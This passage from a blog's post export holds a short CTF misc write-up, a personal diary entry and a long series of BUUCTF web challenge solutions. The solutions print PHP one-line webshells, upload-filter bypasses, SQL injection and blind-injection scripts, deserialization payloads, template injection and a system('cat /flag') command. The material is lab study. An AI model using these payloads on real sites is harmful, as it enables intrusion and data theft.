520迎新赛]StrangeTraffic导出tcp流 从服务器分组获取一串密文 同一个首字母的我们只复制最后一组 1R.G.V.z.d.D.B.n.M.3s.z.M.U.E.1.Q.k.V.BN.i.1.G.M.j.B.E.L.UY.x.O.E.E.t.R.T.h.FQ.S.0.y.O.U.I.0.R.jI.1.N.z.E.w.O.E.J.9A.B.C.D.E.F.G.H.I.J 经过python处理 1RGVzdDBnM3szMUE1QkVBNi1GMjBELUYxOEEtRThFQS0yOUI0RjI1NzEwOEJ9ABCDEFGHIJ 然后直接base64 即可得到flag 1Dest0g3&#123;31A5BEA6-F20D-F18A-E8EA-29B4F257108B&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"http://xxxkkk578.github.io/categories/CTF/"}],"tags":[{"name":"CTF,Misc","slug":"CTF-Misc","permalink":"http://xxxkkk578.github.io/tags/CTF-Misc/"}]},{"title":"杂记","slug":"杂记/post","date":"2024-04-09T15:09:33.000Z","updated":"2024-04-09T16:20:12.447Z","comments":true,"path":"2024/04/09/杂记/post/","permalink":"http://xxxkkk578.github.io/2024/04/09/%E6%9D%82%E8%AE%B0/post/","excerpt":"","text":"杂记总而言之，就是对自己十分失望。 还是应该让自己闲下来，就算是发呆也好。未来应当做什么呢？大抵是离不开网络攻防了，毕竟开端已定，后续的路延伸向何方，已是极为明显的事情了。只得以此为饭碗，提升技艺，争取混口饭吃。最优的选择当然还是进入部队，吃国家饭，稳妥。实在不行，成为公司狗也不是不可以。都无所谓，我早已对这些事情毫不在乎，关键的事情是找件事来做，将一辈子的心血倾注其上，唯有如此才能有所收获，无愧此生。 我已完全厌倦。 大概会被人称作是窝囊废吧，但这也已经是无法避免的结局。对于世界的种种，我已无心力反抗。","categories":[{"name":"杂记","slug":"杂记","permalink":"http://xxxkkk578.github.io/categories/%E6%9D%82%E8%AE%B0/"}],"tags":[{"name":"Literature","slug":"Literature","permalink":"http://xxxkkk578.github.io/tags/Literature/"}]},{"title":"BUUCTF篇-Web部分题解","slug":"CTF/buu_web","date":"2024-04-09T15:09:33.000Z","updated":"2024-04-09T16:47:52.982Z","comments":true,"path":"2024/04/09/CTF/buu_web/","permalink":"http://xxxkkk578.github.io/2024/04/09/CTF/buu_web/","excerpt":"","text":"BUUCTF篇Web1、 [极客大挑战 2019]Upload1一句话 上传shell.php文件 文件内容为 则连接密码为123 1&lt;?php @eval($_POST[&#x27;123&#x27;])?&gt; 1GIF89a? &lt;script language=&quot;php&quot;&gt;eval($_REQUEST[123])&lt;/script&gt; 页面返还 1Not image! 使用burp抓包修改文件类型即可 修改内容为 1Content-type:image/jpg 页面返还 1not php！ 则说明后缀为php是不行的 因此需要其他后缀进行绕过 1phtml、pht、php、php3、php4、php5 上传成功 之后需要点击该文件才能产生连接 需要访问upload目录 再用蚁剑或菜刀连接即可 2、 [ACTF2020 新生赛]Upload首先上穿最基本的一句话php 并且直接用phtml作为文件后缀 1该文件不允许上传，请上传jpg、png、gif结尾的图片噢！ 则类似上题 burp抓包后修改文件类型 12嘿伙计，你发现它了！ 未选择任何文件 Upload Success! Look here~ ./uplo4d/17a92c8d532f506204d798bc569ce42e.phtml 直接搞定了 最后还是蚁剑连一下 找flag 一般都在根目录 3、[极客大挑战 2019]BabySQL进去后是典型的输入用户名和密码的登录框 按如下方法进行测试 即不断更改单引号的位置 然后观察报错的内容 如在password中输入admin’ 后 页面返回报错内容为 其中admin最外层的两个单引号是报错给的 1for the right syntax to use near &#x27;&#x27;admin &#x27;&#x27;&#x27; 因此可以通过在password框中输入如下代码来进行测试 1admin&#x27; 语句 # 经测试 发现or, select,where, union 均被过滤 应该是被replace函数替代成为了空字符 因 因此采用联合查询的方式 1admin&#x27; uunionnion sselectelect 1,2%23 # 报错 加一列试试 1admin &#x27; uunionnion sselectelect 1,2,3%23 # 返回的页面为 12Hello ‘2’Your password is &#x27;3’ 因此注入的代码中 2，3两个位置可以用来显示 继续查表 1234admin&#x27; uunionnion sselectelect 1,2,group_concat(table_name)ffromrom infoorrmation_schema.tableswwherehere table_schema=database() # 1wwherehere table_schema=database() 加上则代表查询到的是用户自定义的表 返回的页面为 12Hello ‘2’Your password is &#x27;b4bsql,geekuser’ 知道了表名之后继续查询列相关的信息 12admin&#x27; UNunionION SEselectLECT 1,2,GROUP_CONCAT(column_name) FfromROM infoorrmation_schema.columns WHwhereERE table_name = &#x27;b4bsql&#x27;# 查询结果 12第一行都一样 不写了Your password is &#x27;id,username,password 查询另一个表 12admin&#x27; UNunionION SEselectLECT 1,2,GROUP_CONCAT(column_name) FfromROM infoorrmation_schema.columns WHwhereERE table_name = &#x27;geekuser&#x27;# 查询结果同上 接下来直接爆数据即可 1admin &#x27; UNunionION SEselectLECT 1,2,GROUP_CONCAT(passwoorrd) frfromom b4bsql # 4、 [极客大挑战 2019]PHP1因为每次猫猫都在我键盘上乱跳，所以我有一个良好的备份网站的习惯 和备份相关的 则扫描根目录 1python dirsearch.py -u https://target 里面有个flag.php 但是是唬人的 打开index.php 发现了和序列化相关的内容 12345&lt;?php include &#x27;class.php&#x27;; $select = $_GET[&#x27;select&#x27;]; $res=unserialize(@$select); ?&gt; 打开class.php源码看看 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phpinclude &#x27;flag.php&#x27;;error_reporting(0);class Name&#123; private $username = &#x27;nonono&#x27;; private $password = &#x27;yesyes&#x27;; public function __construct($username,$password)&#123; $this-&gt;username = $username; $this-&gt;password = $password; &#125; function __wakeup()&#123; $this-&gt;username = &#x27;guest&#x27;; &#125; function __destruct()&#123; if ($this-&gt;password != 100) &#123; echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;; echo &quot;You name is: &quot;; echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;; echo &quot;You password is: &quot;; echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;; die(); &#125; if ($this-&gt;username === &#x27;admin&#x27;) &#123; global $flag; echo $flag; &#125;else&#123; echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;; die(); &#125; &#125;&#125;?&gt; 分析如下 顺序执行 在__wakeup函数中 username变为guest 要想阻止它就要跳过这个函数 在__destruct函数中 password必须等于100 否在在第一个分支中die就结束了 同时username必须等于admin 脚本 123456789101112131415&lt;?phpclass Name&#123; private $username = &#x27;nonono&#x27;; private $password = &#x27;yesyes&#x27;; public function __construct($username,$password)&#123; $this-&gt;username = $username; $this-&gt;password = $password; &#125;&#125;$a = new Name(&#x27;admin&#x27;, 100);var_dump(serialize($a));?&gt; 运行脚本之后得到的结果 1、在线php即可运行 2、或者直接在php目录下运行亦可 1O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125; 前文提到过 需要跳过__wakeup函数 来保证username为admin而不是guest 则修改为将2修改为3之后 意为有3个参数 而__wakeup函数只接受两个参数 故可实现跳过 1O:4:&quot;Name&quot;:3:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125; 又因为username和password 是private定义的 此私有字段的字段名在序列化时前面会加上0的前缀 即%00 故最终的操作为 1O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125; 构造反序列化 1/?select=O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125; 复制到网址后面即可 5、[ACTF2020 新生赛]BackupFile经扫描目录后发现 12[09:48:36] 200 - 0B - /flag.php[09:49:30] 200 - 347B - /index.php.bak 1index.php.bak 打开该文件后 查看到源代码 1234567891011121314151617&lt;?phpinclude_once &quot;flag.php&quot;;if(isset($_GET[&#x27;key&#x27;])) &#123; $key = $_GET[&#x27;key&#x27;]; if(!is_numeric($key)) &#123; exit(&quot;Just num!&quot;); &#125; $key = intval($key); $str = &quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;; if($key == $str) &#123; echo $flag; &#125;&#125;else &#123; echo &quot;Try to find out source file!&quot;;&#125; 首先key只能是数字 其次比较的是key的十进制大小 在php中 两个等号&#x3D;&#x3D; 代表弱比较 弱比较：等长的两个字符串 全部变为整数 如果含有字母 则值为0 再进行比较是否相等 因此在这个情况下只需要传入 在index.php下 或者直接在起始目录下均可 1?key=123 6、[RoarCTF 2019]Easy CalcF12检查源代码发现 calc.php 123456789101112131415$(&#x27;#calc&#x27;).submit(function()&#123; $.ajax(&#123; url:&quot;calc.php?num=&quot;+encodeURIComponent($(&quot;#content&quot;).val()), type:&#x27;GET&#x27;, success:function(data)&#123; $(&quot;#result&quot;).html(`&lt;div class=&quot;alert alert-success&quot;&gt; &lt;strong&gt;答案:&lt;/strong&gt;$&#123;data&#125; &lt;/div&gt;`); &#125;, error:function()&#123; alert(&quot;这啥?算不来!&quot;); &#125; &#125;) return false;&#125;) 点进calc.php之后发现 123456789101112131415&lt;?phperror_reporting(0);if(!isset($_GET[&#x27;num&#x27;]))&#123; show_source(__FILE__);&#125;else&#123; $str = $_GET[&#x27;num&#x27;]; $blacklist = [&#x27; &#x27;, &#x27;\\t&#x27;, &#x27;\\r&#x27;, &#x27;\\n&#x27;,&#x27;\\&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;`&#x27;, &#x27;\\[&#x27;, &#x27;\\]&#x27;,&#x27;\\$&#x27;,&#x27;\\\\&#x27;,&#x27;\\^&#x27;]; foreach ($blacklist as $blackitem) &#123; if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $str)) &#123; die(&quot;what are you want to do?&quot;); &#125; &#125; eval(&#x27;echo &#x27;.$str.&#x27;;&#x27;);&#125;?&gt; 传入num&#x3D;1之后 可以回显 但是传入num&#x3D;a之后 不能回显 并且由blacklist可知 设置了屏蔽 则最后的payload中字符应该使用chr()函数进行绕过 chr里的数字为ascii值 解决方法 在num前添加一个空格 php在读取的时候会默认删除这个空格 而waf又会因为空格检测不到num这个参数 标准的列出文件目录 1? num=var_dump(scandir(/)) 使用chr 1? num=var_dump(scandir(chr(47))) 获取到 1&quot;f1agg&quot; 则 1? num=file_get_contents(/f1agg) 即 1? num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)) 7、[极客大挑战 2019]BuyFlag本题的关键是绕过 1is_numeric 方法 123%00%20 即空格放在数值后面 在改用POST方法之后 在请求头中添加了如下内容 1password=404%20&amp;money=100000000 返回了 123you are CuiterPassword Right!Nember lenth is too long 即数字长度太长 考虑科学计数法进行绕过 1money=1e8 绕过失败 1you have not enough money 那就 1money=1e9 成功 还有一种是根据strcmp函数特性进行绕过的方式 1moneyp[]=100000000 8、 [BJDCTF2020]Easy MD5只有一个框 不知道是干什么用的 抓包后 在request里什么也没找到 但是在response里面找到了 1Hint: select * from &#x27;admin&#x27; where password=md5($pass,true) 看到这个就要想起常用的绕过md5的方式 1ffifdyop 传参后 进入下一个页面 1234567&lt;!--$a = $GET[&#x27;a&#x27;];$b = $_GET[&#x27;b&#x27;];if($a != $b &amp;&amp; md5($a) == md5($b))&#123; // wow, glzjin wants a girl friend.--&gt; 则寻求md5的一组碰撞 或 利用php数组进行绕过 因为哈希函数无法处理数组 故md5函数返回的值一定是false 而false等于false一定成立 1?a[]=1&amp;b[]=2 来到下一个页面 123456789&lt;?phperror_reporting(0);include &quot;flag.php&quot;;highlight_file(__FILE__);if($_POST[&#x27;param1&#x27;]!==$_POST[&#x27;param2&#x27;]&amp;&amp;md5($_POST[&#x27;param1&#x27;])===md5($_POST[&#x27;param2&#x27;]))&#123; echo $flag;&#125; 注意这里的方法是post 因此不能单纯的在url后加上？param1[]&#x3D; 因此使用burp抓包 改为post方法后得到flag 9、 [HCTF 2018]admin查看源代码 发现 1&lt;!-- you are not admin --&gt; 得知 账户需要为admin才可以触发某些东西 尝试输入admin账户 结果密码123直接爆了 1flag&#123;c667ed32-7557-4530-b11c-40031e8dba73&#125; 加入没爆呢 我们按正常的流程来写一写 大致扫一遍每个页面的源代码页 发现密码修改页面出现了github源码泄露 https://github.com/woadsl1234/hctf_flask/ https://github.com/woadsl1234/hctf_flask/ 结果直接找不到该项目 在网上找了找接下来的流程 利用flask进行session伪造 或者利用unicode欺骗 10、[MRCTF2020]你传你🐎呢试了一下 简单的上传并不可以 尝试使用.htaccess方法 在.htaccess文件中写入以下内容 使该目录下带有nene的文件被当成php文件执行 123&lt;FilesMatch &quot;nene&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt; 在上传的过程中记得修改类型 回显 12Warning: mkdir(): File exists in /var/www/html/upload.php on line 23/var/www/html/upload/5666afe9f19a4b6badfdbbd320593274/.htaccess succesfully uploaded! 则 上传成功 再上传nene.png 当然文件内容为一句话木马 上传成功后则连接webshell即可在根目录下找到flag 11、[护网杯 2018]easy_tornado打开页面后发现三个链接 flag 12/flag.txtflag in /fllllllllllllag welcome 12/welcome.txtrender hints 12/hints.txtmd5(cookie_secret+md5(filename)) 则解此题需要知道md5(&#x2F;fllllllllllllag)的值 这个不难 还要知道cookie_secret的值 render提示我们存在模板注入 则尝试以下方式 1error?msg=&#123;&#123;nene&#125;&#125; 页面回显nene 则的确存在模板注入 若想查看cookie_secret 只需要利用模板注入爆出handler.settings即可 则payload为 1error?msg=&#123;&#123;handler.settings&#125;&#125; 则获取到如下信息 12&#123;&#x27;autoreload&#x27;: True, &#x27;compiled_template_cache&#x27;: False, &#x27;cookie_secret&#x27;: &#x27;cd020bca-8f03-4346-aca0-3411a64d4a96&#x27;&#125; 那么就获得了cookie_secret payload如下 1234567import hashlibcookie=&#x27;cd020bca-8f03-4346-aca0-3411a64d4a96&#x27;file_filename=&#x27;/fllllllllllllag&#x27;md5_filename=hashlib.md5(file_filename.encode(encoding=&#x27;UTF-8&#x27;)).hexdigest()word=cookie+md5_filenameflag=hashlib.md5(word.encode(encoding=&#x27;UTF-8&#x27;)).hexdigest()print(flag) 然后拼接一下网址即可 1file?filename=/fllllllllllllag&amp;filehash=0cb78594c1a115a6df1ea1f0a3a359e2 12、[ZJCTF 2019]NiZhuanSiWei进去看到几行代码 12345678910111213141516171819&lt;?php $text = $_GET[&quot;text&quot;];$file = $_GET[&quot;file&quot;];$password = $_GET[&quot;password&quot;];if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;welcome to the zjctf&quot;))&#123; echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;; if(preg_match(&quot;/flag/&quot;,$file))&#123; echo &quot;Not now!&quot;; exit(); &#125;else&#123; include($file); //useless.php $password = unserialize($password); echo $password; &#125;&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; 从上往下依次看 第一个判断 1if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;welcome to the zjctf“) file_get_contents函数从文件中读取内容 这里我们可以用php伪协议中的data:&#x2F;&#x2F;协议来绕过 payload如下 注意是get方法提交参数 因此可以直接在url后面加上?text&#x3D;来测试 1?text=data://text/plain,welcome to the zjctf 绕过成功 接下来是关于flag.php的正则匹配 观察到 1include($file); //useless.php 如果想要查看useless.php的源码 我们可以使用php伪协议的php:&#x2F;&#x2F;flter协议来查看我们使用第二个payload查看该页面的源码 用&amp;&amp;连接 在第一个后面 同时提交这两个参数 1file=php://filter/read=convert.base64-encode/resource=useless.php 1?text=data://text/plain,welcome to the zjctf&amp;&amp;file=php://filter/read=convert.base64-encode/resource=useless.php 得到useless页面的内容 12345678910111213&lt;?php class Flag&#123; //flag.php public $file; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo &quot;&lt;br&gt;&quot;; return (&quot;U R SO CLOSE !///COME ON PLZ&quot;); &#125; &#125; &#125; ?&gt; 从这段代码我们可以看到 Flag会输出flag.php页面的内容 因此我们尝试编写反序列化脚本 123456789101112131415&lt;?php class Flag&#123; //flag.php public $file=&quot;flag.php&quot;; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo &quot;&lt;br&gt;&quot;; return (&quot;U R SO CLOSE !///COME ON PLZ&quot;); &#125; &#125; &#125; $password=new Flag();echo serialize($password);?&gt; 使用php在线工具运行以上脚本得到 1O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; 然后在把三段payload都用&amp;连在一起 因为页面要同时GET这三个参数 1?text=data://text/plain,welcome to the zjctf&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; 进入界面 1234567# welcome to the zjctfoh u find it U R SO CLOSE !///COME ON PLZ 既然已经找到 我们查看页面源代码 得到flag 1flag&#123;19510b2e-c5ec-4d58-8ac3-45f405715b64&#125; 13、 [极客大挑战 2019]HardSQL尝试使用万能密码 无果 11&#x27; or 1=1 # 则尝试使用fuzz获取可以使用的关键词 使用burpsuite抓包 用inturder fuzz一下 知道了具体哪些可以使用 哪些不可以使用 &#x3D;不可使用 但是like可以使用 可以将万能密码修改为 因为((a)like(b))等价于a&#x3D;b 11&#x27;or((1)like(1))# 成功登录 发现1%201不可使用 那么过滤了空格 想到报错注入 报错注入有两种函数可以选择updatexml()函数和extractvalue()函数 这里尝试使用updatexml函数 爆出数据库 11&#x27;or(updatexml(1,concat(0x7e,database(),0x7e),1))# 获取到库名为geek 查表 11&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))# 获取表名为H4rDsq1 查字段 11&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#x27;H4rDsq1&#x27;)),0x7e),1))# 获取字段名为’id,username,password‘ 查找字段内容 11&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(username,&#x27;~&#x27;,password))from(H4rDsq1)),0x7e),1))# 获取部分 ‘flagflag{0f70795b-4266-461e-96’ 使用right突破限制 11&#x27;or(updatexml(1,concat(0x7e,(select(group_concat((right(password,25))))from(H4rDsq1)),0x7e),1))# 获取剩余部分’6-461e-96d7-e1a4c490a2c0}‘ 14、[MRCTF2020]Ez_bypass打开给出的页面 12345678910111213141516171819202122232425262728293031323334353637383940I put something in F12 for youinclude &#x27;flag.php&#x27;;$flag=&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;;if(isset($_GET[&#x27;gg&#x27;])&amp;&amp;isset($_GET[&#x27;id&#x27;])) &#123; $id=$_GET[&#x27;id&#x27;]; $gg=$_GET[&#x27;gg&#x27;]; if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123; echo &#x27;You got the first step&#x27;; if(isset($_POST[&#x27;passwd&#x27;])) &#123; $passwd=$_POST[&#x27;passwd&#x27;]; if (!is_numeric($passwd)) &#123; if($passwd==1234567) &#123; echo &#x27;Good Job!&#x27;; highlight_file(&#x27;flag.php&#x27;); die(&#x27;By Retr_0&#x27;); &#125; else &#123; echo &quot;can you think twice??&quot;; &#125; &#125; else&#123; echo &#x27;You can not get it !&#x27;; &#125; &#125; else&#123; die(&#x27;only one way to get the flag&#x27;); &#125;&#125; else &#123; echo &quot;You are not a real hacker!&quot;; &#125;&#125;else&#123; die(&#x27;Please input first&#x27;);&#125;&#125;Please input first 可以看出来第一步是传两个参数 gg和id 要求这两个变量值不相等 但是md5值相等 即找一组md5的碰撞 或者使用数组来绕过 这里使用数组进行绕过因为是get获取参数 因此可以直接在url中传参 1?id[]=1&amp;gg[]=2 回显 1You got the first steponly one way to get the flag 证明到了第二步 要求使用post方法传入passwd参数 不能是数字 但是要和1234567相等 对于php的&#x3D;&#x3D;弱比较 先等长 再比较 则只要1234567a 即可让passwd既不是数字 还能满足弱比较的要求 post传参后得到flag 1flag&#123;75b3015e-b845-4afa-b6da-6199276733d8&#125; 15、[网鼎杯 2020 青龙组]AreUSerialz打开之后是网页的源代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);class FileHandler &#123; protected $op; protected $filename; protected $content; function __construct() &#123; $op = &quot;1&quot;; $filename = &quot;/tmp/tmpfile&quot;; $content = &quot;Hello World!&quot;; $this-&gt;process(); &#125; public function process() &#123; if($this-&gt;op == &quot;1&quot;) &#123; $this-&gt;write(); &#125; else if($this-&gt;op == &quot;2&quot;) &#123; $res = $this-&gt;read(); $this-&gt;output($res); &#125; else &#123; $this-&gt;output(&quot;Bad Hacker!&quot;); &#125; &#125; private function write() &#123; if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123; if(strlen((string)$this-&gt;content) &gt; 100) &#123; $this-&gt;output(&quot;Too long!&quot;); die(); &#125; $res = file_put_contents($this-&gt;filename, $this-&gt;content); if($res) $this-&gt;output(&quot;Successful!&quot;); else $this-&gt;output(&quot;Failed!&quot;); &#125; else &#123; $this-&gt;output(&quot;Failed!&quot;); &#125; &#125; private function read() &#123; $res = &quot;&quot;; if(isset($this-&gt;filename)) &#123; $res = file_get_contents($this-&gt;filename); &#125; return $res; &#125; private function output($s) &#123; echo &quot;[Result]: &lt;br&gt;&quot;; echo $s; &#125; function __destruct() &#123; if($this-&gt;op === &quot;2&quot;) $this-&gt;op = &quot;1&quot;; $this-&gt;content = &quot;&quot;; $this-&gt;process(); &#125;&#125;function is_valid($s) &#123; for($i = 0; $i &lt; strlen($s); $i++) if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125)) return false; return true;&#125;if(isset($_GET&#123;&#x27;str&#x27;&#125;)) &#123; $str = (string)$_GET[&#x27;str&#x27;]; if(is_valid($str)) &#123; $obj = unserialize($str); &#125;&#125; payload如下 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364&lt;?phpclass FileHandler &#123; private $op=2; private $filename=&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;; private $content; function __construct() &#123; $op = &quot;1&quot;; $filename = &quot;/tmp/tmpfile&quot;; $content = &quot;Hello World!&quot;; // $this-&gt;process(); &#125; public function process() &#123; if($this-&gt;op == &quot;1&quot;) &#123; $this-&gt;write(); &#125; else if($this-&gt;op == &quot;2&quot;) &#123; $res = $this-&gt;read(); $this-&gt;output($res); &#125; else &#123; $this-&gt;output(&quot;Bad Hacker!&quot;); &#125; &#125; private function write() &#123; if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123; if(strlen((string)$this-&gt;content) &gt; 100) &#123; $this-&gt;output(&quot;Too long!&quot;); die(); &#125; $res = file_put_contents($this-&gt;filename, $this-&gt;content); if($res) $this-&gt;output(&quot;Successful!&quot;); else $this-&gt;output(&quot;Failed!&quot;); &#125; else &#123; $this-&gt;output(&quot;Failed!&quot;); &#125; &#125; private function read() &#123; $res = &quot;&quot;; if(isset($this-&gt;filename)) &#123; $res = file_get_contents($this-&gt;filename); &#125; return $res; &#125; private function output($s) &#123; echo &quot;[Result]: &lt;br&gt;&quot;; echo $s; &#125; function __destruct() &#123; if($this-&gt;op === &quot;2&quot;) $this-&gt;op = &quot;1&quot;; $this-&gt;content = &quot;&quot;; // $this-&gt;process(); &#125;&#125;$A=new FileHandler();$B=serialize($A);echo $B; 包含内容： php伪协议读取文件 将protected改为private 因为protected权限的变量序列化之后会在字符前增加%00 反序列化 16、[SUCTF 2019]CheckIn文件上传 试试一句话 1&lt;?php @eval($_POST[&#x27;nene&#x27;])?&gt; 回显 1illegal suffix! 提示后缀违法 迅速想到.htaccess方法 然而.htaccess方法是针对apache的 1exif_imagetype:not image! 看来应该是抓包修改文件类型的 报错 1&lt;? in contents! 解决方法：更换payload 12GIF89a? &lt;script language=&quot;php&quot;&gt;eval($_REQUEST[nene])&lt;/script&gt; 123Your dir uploads/f65a0ca982c669865231909b0ec85a0c Your files : array(5) &#123; [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(9) &quot;.user.ini&quot; [3]=&gt; string(5) &quot;1.jpg&quot; [4]=&gt; string(9) &quot;index.php&quot; &#125; 对于nginx 上传.user.ini文件 它可以使我们对目录中的任何一个文件访问时 都调用.user.ini文件中指定的类型对其进行读取 注意该文件也需要加文件幻术头 12GIF89aauto_prepend_file=1.jpg 然后蚁剑即可然而蚁剑连不上这里使用的方法是 注意最后一定要带分号 否则无法执行 1index.php?nene=system(&#x27;cat /flag&#x27;); 17、[GXYCTF2019]BabyUpload应该又是一道文件上传的题目一句话 12GIF89a? &lt;script language=&quot;php&quot;&gt;eval($_REQUEST[nene])&lt;/script&gt; 直接上传php文件时 1上传类型也太露骨了吧！ 上传phtml文件 1后缀名不能有ph！ 则应该需要辅助上传文件随便输一段url 看看服务器类型 1Apache/2.4.10 (Debian) Server at f8939c1f-6a09-486e-b9eb-0e5198a5f3bd.node5.buuoj.cn Port 80 apache则 用.htaccess上传时修改content-type为 1image/jpeg 则上传成功然后直接用蚁剑连接即可 18、[GXYCTF2019]BabySQli有用户名和密码登录框 仅对密码部分进行修改 11&#x27; 回显 1wrong pass! 可能存在关键词过滤 fuzz一下fuzz完发现在password里所有的关键词全被过滤了试试username发现username是存在注入的当username只输入 1&#x27; 回显 1Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;&#x27;&#x27;&#x27; at line 1 if we try the payload below 1&#x27;union select 1,2%23 # 回显 1Error: The used SELECT statements have a different number of columns add one more column 1&#x27;union select 1,2,3 %23 return 1wrong user then we can confirm that there are 3 columns in totalpayload to get the table names 123&#x27; union select 1,2,group_concat(table_name)from information_schema.tableswhere table_schema=database() %23 however it gives us this in return 1do not hack me! 联合查询会将数据插入到表中 利用这个机制 我们可以新建admin账户来登录admin尝试payload 1&#x27; union select 1,&#x27;admin&#x27;,3# 提示wrong pass， 说明用户名是正确的接着通过联合查询新建密码 并登录发现还是不行尝试上传密码的md5值 成功 19、[GYCTF2020]Blacklistsql注入加blacklist 想到预编译和handler先测试注入点 11&#x27; or 1=1 # 回显 1234567891011121314151617181920array(2) &#123; [0]=&gt; string(1) &quot;1&quot; [1]=&gt; string(7) &quot;hahahah&quot;&#125;array(2) &#123; [0]=&gt; string(1) &quot;2&quot; [1]=&gt; string(12) &quot;miaomiaomiao&quot;&#125;array(2) &#123; [0]=&gt; string(6) &quot;114514&quot; [1]=&gt; string(2) &quot;ys&quot;&#125; 爆库 11&#x27;;show databases;# 爆表 11&#x27;;show tables;# 发现flag 123456789array(1) &#123; [0]=&gt; string(8) &quot;FlagHere&quot;&#125;array(1) &#123; [0]=&gt; string(5) &quot;words&quot;&#125; 预编译payload 11&#x27;;prepare nene from concat (&#x27;s&#x27;,&#x27;elect&#x27;,&#x27;* from `miaomiaomiao`&#x27;);execute nene;; 预编译也被过滤了 1return preg_match(&quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\\./i&quot;,$inject); 那就handler 11&#x27;;handler `FlagHere` open;handler `FlagHere` read first;handler `FlagHere` read close; 得到flag 20、[CISCN2019 华北赛区 Day2 Web1]Hack World注入检测 先随便输几个 1SQL Injection Checked. 看来不是报错注入 那就是bool盲注已知 123### All You Want Is In Table &#x27;flag&#x27; and the column is &#x27;flag&#x27;### Now, just give the id of passage python脚本 12345678910111213141516171819202122232425262728293031323334import requests url = &quot;http://ece36d87-bdcb-4e2c-83dd-d78a86059e51.node5.buuoj.cn:81/index.php&quot; result = &quot;&quot; num = 0 # 用了来判断是不是flag已经拼完整了 for i in range(1, 60): if num == 1: break for j in range(32, 128): payload = &quot;if(ascii(substr((select(flag)from(flag)),%d,1))=%d,1,2)&quot; % (i, j) # print(str((i-1)*96+j-32)+&quot;:~&quot;+payload+&quot;~&quot;) data = &#123; &quot;id&quot;: payload, &#125; r = requests.post(url, data=data) r.encoding = r.apparent_encoding if &quot;Hello&quot; in r.text: x = chr(j) result += str(x) print(result) break if &quot;&#125;&quot; in result: print(result) num = 1 break 代码解析 关键部分就在payload 其余都很好理解 1payload = &quot;if(ascii(substr((select(flag)from(flag)),%d,1))=%d,1,2)&quot; % (i, j) i为flag的第i个字母j为可见字符的ascii值因为是已知flag表中的flag列 因此select flag from flagsubstr函数用来截取字符串其用法为 1SUBSTR (str, pos, len) str为字符串 即flagpos为起始位置len为截取字符个数因此这个函数的意思就是选择flag的第i个字母转化为ascii值后再执行ifsql中if的用法 1IF( expr1 , expr2 , expr3 ) 当expr1为true时 返回expr2false 返回expr3这也是为什么后面要判断hello是否在回显结果里说了id 因此请求头的id放payload 当然也可抓包再看 21、[RoarCTF 2019]Easy Java给了一个登陆页面 还有一个helphelp点进去后 1java.io.FileNotFoundException:&#123;help.docx&#125; 查看源代码 发现help对应的源代码 1&lt;a href=&quot;Download?filename=help.docx&quot; target=&quot;_blank&quot;&gt;help&lt;/a&gt; 由java web相关知识 12345/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则 /WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在.jar文件中 /WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件 /WEB-INF/src/：源码目录，按照包名结构放置各个java文件 /WEB-INF/database.properties：数据库配置文件 则构造payload 接在url后面 1/Download?filename=WEB-INF/web.xml 不行 则更换post方法 下载成功 发现源码 